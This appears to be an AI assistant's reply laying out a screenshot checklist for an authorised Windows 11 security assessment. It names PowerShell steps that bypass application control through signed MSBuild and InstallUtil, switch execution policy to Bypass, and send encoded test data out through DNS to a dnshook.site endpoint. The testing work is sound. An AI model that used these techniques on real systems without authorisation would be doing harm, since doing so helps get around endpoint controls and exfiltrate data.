@@ -1,0 +1,338 @@
+Yep. Based on your current issue list, I’d use the following as a basic evidence-capture note. It’s designed so you can work through each issue and know exactly what screenshot(s) you need. Your current findings are supported by the issue descriptions in the draft.    Pasted text
+# ASIC Windows 11 SOE – Screenshot Capture Checklist
+
+General:
+- Keep the username/hostname visible where useful.
+- Prefer one clean screenshot per key point rather than lots of screenshots.
+- Ensure commands and resulting output are visible in the same screenshot.
+- Do not include client-sensitive information unless required to demonstrate the issue.
+- Capture Airlock notifications where they form part of the evidence.
+- Where possible, start PowerShell screenshots with:
+
+whoami
+hostname
+
+
+---
+
+## Issue 01 – Application Control Bypass via Trusted Microsoft Binaries – HIGH
+
+### Screenshot 01 – MSBuild code execution
+
+Run:
+
+```powershell
+whoami
+
+& "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" `
+    "$env:TEMP\Ionize-MSBuild-Test.csproj" `
+    /t:IonizeTest /nologo /verbosity:minimal
+
+Capture:
+- Standard-user identity.
+- MSBuild command.
+- Ionize MSBuild application control test output.
+- Username / hostname marker.
+- Successful execution.
+Caption:
+User-controlled C# successfully executed through Microsoft-signed MSBuild.exe from a standard-user context.
+
+Screenshot 02 – InstallUtil code execution
+Run the existing working test:
+whoami
+
+& "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe" `
+    /LogToConsole=true `
+    "$env:TEMP\Ionize-InstallUtil-Test.dll"
+
+Get-Content "$env:TEMP\Ionize-InstallUtil-Executed.txt"
+
+Capture:
+- Standard-user identity.
+- InstallUtil command.
+- Successful execution.
+- Ionize marker file contents.
+Caption:
+User-controlled .NET code successfully executed through Microsoft-signed InstallUtil.exe from a standard-user context.
+
+Screenshot 03 – CSC successfully compiles code
+Run:
+$src = "$env:TEMP\Ionize-CSC-Test.cs"
+$out = "$env:TEMP\Ionize-CSC-Test.exe"
+
+& "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" `
+    /out:$out `
+    $src
+
+Get-Item $out
+
+Capture:
+- CSC command.
+- Successful compilation.
+- Resulting EXE path.
+Caption:
+Microsoft csc.exe successfully compiled user-controlled C# into an executable.
+
+Screenshot 04 – Airlock blocks CSC-generated EXE
+Run:
+& "$env:TEMP\Ionize-CSC-Test.exe"
+
+Capture:
+- Attempted execution.
+- Airlock block notification/message.
+Caption:
+Airlock successfully prevented direct execution of the executable generated using csc.exe.
+
+Optional Screenshot 05 – Microsoft signatures
+Get-AuthenticodeSignature "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" |
+Select Status,@{N='Signer';E={$_.SignerCertificate.Subject}},Path
+
+Get-AuthenticodeSignature "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe" |
+Select Status,@{N='Signer';E={$_.SignerCertificate.Subject}},Path
+
+Capture Valid and Microsoft signer details.
+Issue 02 – Unenforced PowerShell Execution Policy – HIGH
+Screenshot 01 – Original policy configuration
+If CurrentUser has already been reset:
+Get-ExecutionPolicy -List
+Get-ExecutionPolicy
+
+Capture:
+- LocalMachine = RemoteSigned.
+- MachinePolicy/UserPolicy undefined.
+- CurrentUser original state.
+Screenshot 02 – Standard user changes policy
+whoami
+
+Set-ExecutionPolicy -Scope CurrentUser Bypass -Force
+
+Get-ExecutionPolicy -List
+Get-ExecutionPolicy
+
+Capture:
+- Standard-user identity.
+- CurrentUser = Bypass.
+- Effective execution policy = Bypass.
+Caption:
+A standard user was able to override the LocalMachine RemoteSigned configuration by configuring Bypass at CurrentUser scope.
+
+Cleanup
+Set-ExecutionPolicy -Scope CurrentUser Undefined -Force
+
+Do not screenshot cleanup unless required.
+Issue 03 – Unrestricted PowerShell (Full Language Mode) – HIGH
+Screenshot 01 – PowerShell available in Full Language Mode
+Run:
+whoami
+$PSVersionTable.PSVersion
+$ExecutionContext.SessionState.LanguageMode
+
+Capture:
+- Standard-user identity.
+- PowerShell version.
+- FullLanguage.
+Caption:
+PowerShell was accessible to the standard user and operated in Full Language Mode.
+
+One screenshot should be enough.
+Issue 04 – Insufficient PowerShell Security Logging – MEDIUM
+Screenshot 01 – Script Block Logging
+reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
+
+If the key exists:
+reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging
+
+Capture the disabled value or absence of configured logging.
+Screenshot 02 – Transcription
+reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription"
+
+Capture disabled/not configured result.
+Screenshot 03 – Module Logging
+reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging"
+
+Capture absent/not configured result.
+If all three fit cleanly in one console window, use one screenshot rather than three.
+Caption:
+Enhanced PowerShell Script Block, Module and Transcription logging controls were not enabled.
+
+Issue 05 – DNS-Based Data Exfiltration – MEDIUM
+Screenshot 01 – DNS query containing encoded test data
+Use the existing benign Ionize test value.
+Capture the PowerShell command used to generate the DNS query, for example:
+Resolve-DnsName "<encoded-Ionize-value>.<unique-domain>.dnshook.site"
+
+Capture:
+- Encoded hostname.
+- Successful DNS resolution/request.
+Screenshot 02 – Externally received DNS request
+Open DNSHook / Webhook.site.
+Capture:
+- The unique test domain.
+- Received DNS request.
+- Encoded data visible in the requested hostname.
+Do not expose unnecessary account/session identifiers.
+Screenshot 03 – Decode proof
+If useful, decode the captured value locally and show that it resolves back to the benign Ionize string.
+Caption:
+Benign Ionize-controlled test data encoded within a DNS hostname was successfully received at an externally controlled DNS endpoint.
+
+Issue 06 – Data Infiltration via Removable Media and Web Services – MEDIUM
+Screenshot 01 – USB file ingress
+Insert the approved test USB.
+Copy a benign test file from USB to the workstation.
+Capture:
+- Source file on USB.
+- Same file successfully present in Downloads/Desktop.
+Prefer showing both locations in File Explorer.
+Caption:
+A file was successfully copied from removable USB storage onto the SOE.
+
+Screenshot 02 – Web/GitHub file ingress
+Download a harmless test file from GitHub.
+Capture:
+- GitHub URL/browser.
+- Successful download.
+- Downloaded file visible locally.
+Caption:
+A file was successfully downloaded from GitHub onto the SOE over HTTPS.
+
+Optional Screenshot 03 – USB exfiltration blocked
+Attempt to copy a benign local test file back to USB.
+Capture the block/error.
+Caption:
+Outbound copying of files from the SOE to removable USB storage was prevented.
+
+Optional Screenshot 04 – Web upload blocked
+If you already have clean evidence, include the browser showing the attempted upload being blocked.
+This is useful as compensating-control evidence but is not required to demonstrate the infiltration issue.
+Issue 07 – LAPS Password Length Below Recommended Hardening Level – LOW
+Screenshot 01 – LAPS configuration
+Run:
+reg query "HKLM\SOFTWARE\Microsoft\Policies\LAPS"
+
+Capture the relevant configuration including:
+PasswordLength    REG_DWORD    0xf
+
+0xf = 15 decimal.
+If the managed administrator account is visible in the same configuration, include it.
+Caption:
+Windows LAPS was configured with a managed local administrator password length of 15 characters.
+
+One screenshot should be enough.
+Issue 08 – Account Lockout Threshold Exceeds Recommended Value – LOW
+Screenshot 01 – Account lockout policy
+Run:
+net accounts
+
+Capture:
+Lockout threshold: 8
+
+Also retain the lockout duration/reset values in the screenshot if visible.
+Caption:
+The account lockout threshold was configured to permit eight invalid authentication attempts.
+
+One screenshot is enough.
+Issue 09 – NetBIOS over TCP/IP Enabled – LOW
+Screenshot 01 – Active interface NetBIOS configuration
+Try:
+Get-CimInstance Win32_NetworkAdapterConfiguration |
+Where-Object {$_.IPEnabled -eq $true} |
+Select-Object Description,IPAddress,TcpipNetbiosOptions
+
+Interpretation:
+0 = Use DHCP setting
+1 = Enable NetBIOS
+2 = Disable NetBIOS
+
+If the active adapter explicitly reports 1, capture it.
+Alternatively, if your existing test clearly showed NetBIOS enabled, use that original evidence.
+Caption:
+NetBIOS over TCP/IP was enabled on the active network interface.
+
+Make sure the screenshot identifies the active Wi-Fi/Ethernet adapter rather than an unused adapter.
+Issue 10 – Web Advertising Content Not Restricted – LOW
+Screenshot 01 – Advertising content accessible
+Browse to an approved/public website that visibly serves advertising content.
+Capture:
+- Browser URL/address bar.
+- Advertising content visibly rendered.
+- Enough of the page to demonstrate it is genuine web content.
+Avoid using a screenshot that only shows an empty ad placeholder.
+Caption:
+Advertising content was accessible from the SOE and was not prevented by the implemented web-filtering controls.
+
+Optional Screenshot 02 – Filtering comparison
+If useful:
+- revshells.com accessible.
+- exploit-db.com blocked.
+This can demonstrate inconsistent filtering.
+Do not download anything.
+Issue 11 – User-Modifiable Excel External Data Connection Security – LOW
+Screenshot 01 – Excel Trust Center
+Open:
+Excel → File → Options → Trust Center → Trust Center Settings → External Content
+Capture:
+- Enable all Data Connections.
+- Setting is editable by the standard user.
+- Other centrally managed/greyed settings if visible.
+If possible, take one screenshot showing the contrast between locked controls and the editable Data Connections option.
+Caption:
+The standard user could modify the Excel external data connection security setting despite other Trust Center controls being centrally restricted.
+
+Do not actually connect to an external data source.
+Issue 12 – Windows Firewall Connection Logging Disabled – INFORMATIONAL
+Screenshot 01 – Firewall profiles and logging state
+Try:
+Get-NetFirewallProfile |
+Select-Object Name,Enabled,LogAllowed,LogBlocked,LogFileName
+
+Capture:
+- Domain profile.
+- Private profile.
+- Public profile.
+- Firewall enabled.
+- LogAllowed / LogBlocked disabled.
+If that command is restricted, use:
+netsh advfirewall show allprofiles
+
+Capture the logging configuration for each profile.
+Caption:
+Windows Firewall remained enabled; however, permitted and/or dropped connection logging was disabled across the reviewed profiles.
+
+Try to include the firewall Enabled state in the same screenshot so it is clear this is a logging issue rather than the firewall being disabled.
+Additional Firmware / UEFI Evidence
+Not currently a confirmed report issue, but capture this now in case it is needed later.
+Screenshot / Photo 01 – Secure Boot
+Capture:
+- Secure Boot = Enabled.
+- Setting locked/not user-modifiable.
+Screenshot / Photo 02 – Secured Core
+Capture:
+- Secured Core = Enabled.
+- Setting locked/not user-modifiable.
+Screenshot / Photo 03 – Boot Order
+Capture:
+- Boot-device enable/disable options.
+- Boot order is user-modifiable.
+Screenshot / Photo 04 – Managed Firmware Controls
+Capture an example showing:
+- Device settings locked.
+- Advanced boot settings locked.
+- Intune/device management indicated.
+Screenshot / Photo 05 – Date/Time
+If useful, capture the editable UEFI date/time interface.
+Record in notes:
+UEFI date/time was user-modifiable. A one-minute change was used as a bounded validation test.
+
+External Boot Test
+If performed:
+- Photograph USB above Windows Boot Manager in boot order.
+- Photograph whether external media boots or is rejected.
+- Do not mount or modify the Windows system disk.
+- Do not clear/disable TPM.
+- Do not disable Secure Boot.
+- Do not initiate management recovery/reprovisioning.
+
+A couple of screenshots are particularly important to get cleanly: **Issue 01 needs the MSBuild/InstallUtil successes plus the CSC/Airlock contrast**, because your report specifically states all three behaviours. :chatgpt-content-reference{index="1"} For the PowerShell findings, make sure the screenshots separately prove the **policy override**, **FullLanguage**, and **logging configuration** rather than trying to reuse one screenshot for everything. :chatgpt-content-reference{index="2"} :chatgpt-content-reference{index="3"} :chatgpt-content-reference{index="4"}
+
+One thing I noticed in the current draft: **Issue 10's Impact and Recommendation are still copied from the NetBIOS issue**, so you'll want to replace those before the report is final. :chatgpt-content-reference{index="5"}
